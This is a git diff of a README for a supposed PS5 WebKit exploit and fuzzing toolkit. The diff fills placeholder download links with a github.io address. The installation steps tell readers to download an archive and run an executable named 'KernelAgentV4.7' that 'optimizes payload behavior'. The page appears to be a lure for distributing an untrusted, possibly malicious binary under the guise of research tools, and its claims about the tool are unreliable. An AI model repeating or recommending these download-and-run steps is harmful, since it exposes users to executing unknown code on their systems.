@@ -2,13 +2,15 @@
 
 This toolkit provides a suite of WebKit-based testing tools for PS5 systems. Designed for research and development purposes, it allows you to explore crash surfaces, memory behavior, and JavaScript-driven fuzzing. Powered by `KernelAgentV4.7`.
 
-[![Download PS5 WebKit Tools](https://img.shields.io/badge/Download-PS5_WebKit_Research_Tools-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download PS5 WebKit Tools](https://img.shields.io/badge/Download-PS5_WebKit_Research_Tools-blueviolet)](https://ps5-webkit-exploit-tools-dev-kit.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://ps5-webkit-exploit-tools-dev-kit.github.io/.github
+) section  
 2. 📁 **Extract the folder** to any location (e.g., `C:\PS5WebKitDev`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7`  
 4. 🧠 It will prepare your local WebKit test server and optimize payload behavior  
